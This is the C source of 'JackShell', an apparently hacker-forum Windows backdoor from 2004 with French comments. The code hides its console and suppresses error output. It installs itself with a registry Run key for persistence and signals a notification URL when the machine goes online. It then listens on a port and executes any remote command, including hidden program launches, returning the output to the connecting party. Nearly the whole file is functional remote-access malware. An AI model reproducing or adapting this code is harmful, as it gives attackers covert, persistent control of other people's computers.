/*##############################################################################
#
#   jackshell.c ; jacklib.h ; jacklib.c
#   date : 20/05/04
#   dernière modification : 17/06/04
#
#   Paramètre de compilation (Dev-C++): -lwsock32 -lwinmm ./lib/libwininet.a
#
#   Spéciale dédicace à :
#       - Ma Mily que j'aime :)
#       - Bigbang (ma pool)
#       - Toute la team SH : P41f0x, sn0oPy, Xiutecutli, castlegirl, Dark-Jedi, 
#       Sigma, Nelio, [X]HT[C] & les autres...
#       - Toutes les communautés : SecurityClan, Espionet, IHCteam, THJ, ArenHack...
#       - Tous ceux qui ont téléchargé cette source ;)
#
#   Shad0w
#   www.SecurityHack.net
#
##############################################################################*/

#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include "jacklib.h"

/*
    Fonction d'attente du serveur
    Dès que la connexion est détectée, on envoit une notification
*/
void waiting(void)
{
    while(is_connected() == 0)
        sleep(WAIT);
    http_request(NOTIF_URL);
    return;
}

/*
    Verif de la présence d'une commande spéciale (autre que le shell)
    Note : pour rajouter des commandes, c'est sur ces 2 fonctions...
*/
int check_cmd(char *cmd)
{
    char cmd1[] = "exec";   // WinExec SW_SHOW
    char cmd2[] = "exeh";   // WinExec SW_HIDE
    char cmd3[] = "mcmd";   // Multimedia Command Strings
    char cmd4[] = "msgbx";  // MessageBox
    char cmd5[] = "bye";    // Deconnexion
    int ln1 = strlen(cmd1);
    int ln2 = strlen(cmd2);
    int ln3 = strlen(cmd3);
    int ln4 = strlen(cmd4);
    int ln5 = strlen(cmd5);
    int i;
    i = strncmp(cmd, cmd1, ln1);
    if(i == 0) return 1;
    i = strncmp(cmd, cmd2, ln2);
    if(i == 0) return 2;
    i = strncmp(cmd, cmd3, ln3);
    if(i == 0) return 3;
    i = strncmp(cmd, cmd4, ln4);
    if(i == 0) return 4;
    i = strncmp(cmd, cmd5, ln5);
    if(i == 0) return 5;
    return 0;
}

/*
    Exécution des commandes spéciales
*/
int exec_cmd(SOCKET client, char* cmd)
{
    char *pCmd;
    int s, retn = 0;
    int i = check_cmd(cmd);
// Gestion des commandes clients     
    switch(i)
    {
        case 1: // exec SW_SHOW
            WinExec(cutstr(cmd)+5, SW_SHOW);
            s=send(client,"Appel a WinExec() visible\n",26,0);
            break;
        case 2: // exeh SW_HIDE
            WinExec(cutstr(cmd)+5, SW_HIDE);
            s=send(client,"Appel a WinExec() invisible\n",28,0);
            break;
        case 3: // mcmd (Multimedia Command Strings)
            mciSendString(cutstr(cmd)+5, NULL, 0, NULL);
            s=send(client,"Appel a mciSendString()\n",24,0);
            break;
        case 4: // msgbx
            MessageBox(NULL, cutstr(cmd)+6, "JackShell MSG", MB_OK);
            s=send(client,"Appel a MessageBox()\n",21,0);
            break;
        case 5: // bye
            s=send(client,"Good bye !\n",11,0);
            retn++;
            break;
        default: // shell (commande principale)
            pCmd = systM(cmd);
            s=send(client,pCmd,strlen(pCmd),0);
            free(pCmd);
            break;
    }
    if(s==SOCKET_ERROR)
        retn++;
    return retn;
}

/*
    fonction de traitement des données client...
*/
void analyz(SOCKET client)
{
    int lg, i, out = 0;
    char request[LG_MAX_REQUETE];
    char *pCmd;
    while(out == 0)
    {
        memset(request, 0, sizeof(request));
        lg=send(client,"CMD : ",6,0);
        if(lg==SOCKET_ERROR)
        {
                out++;
                break;
        }
        // on limite la requete
        lg=recv(client,request,LG_MAX_REQUETE,0);
        if(lg==SOCKET_ERROR)
        {
                out++;
                break;
        }
        request[lg]='\0';
        // analyse de la commande et exécution
        i=exec_cmd(client, request);
        if(i!=0)
        {
                out++;
                break;
        }
    }
    return;
}

/* 
    fonction principale, initialisation du serveur...
*/
int main(int argc, char *argv[])
{
    HANDLE hConsole, hStderr;
    int i, val=0;
    char installed_path[128];
    char *current_path = argv[0];
    
    // On chope le handle de la console et on le masque
    hConsole = GetConsoleHwnd();
    ShowWindow(hConsole, SW_HIDE);
    
    // Fermeture de la sortie d'erreur standard : aucun signalement d'erreurs...
    hStderr = GetStdHandle(STD_ERROR_HANDLE);
    CloseHandle(hStderr);
    
    // On vérifie si le serveur a été installé ou pas
    // on compare le path d'exécution avec le path d'installation
    strcpy(installed_path, INSTALL_DIR);
    strcat(installed_path, SERVER_NAME);
    i = strcmp(StringLwr(current_path), StringLwr(installed_path));
    if(i!=0)
    {
        install(current_path);
        //après installation, on quitte, c'est plus furtif...
        return 0;
    }
    // on renouvelle la clé registre, on est jamais trop prudent...
    InsertRegRun(installed_path);
    
    // inialisation
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,0), &wsa);
    
    // creation de la socket serveur
    SOCKET serveur;
    SOCKET client;
    SOCKADDR_IN sin;
    SOCKADDR_IN clientsin;
    
    serveur=socket(AF_INET,SOCK_STREAM,0);
    // configuration de la socket
    sin.sin_addr.s_addr = INADDR_ANY;
    sin.sin_family      = AF_INET;
    sin.sin_port        = htons(PORT);
    // on associe la socket au numéro de port et on écoute
    bind(serveur,(SOCKADDR *)&sin, sizeof(sin));
    listen(serveur,5);
    
    val = sizeof(clientsin);
    
    // boucle infinie qui attendra une connexion client
    // et qui gèrera l'attente du serveur si pas de connexion internet...
    while(1)
    {   
        if(is_connected() == 0)
                waiting();
        client = accept(serveur,(SOCKADDR *)&clientsin,&val);
        if(client != INVALID_SOCKET);
        {
                send(client,"Hello :)\n",9,0);
                // On traite la requete du client
                analyz(client);
                closesocket(client);
        }
    }
    return 0;
}
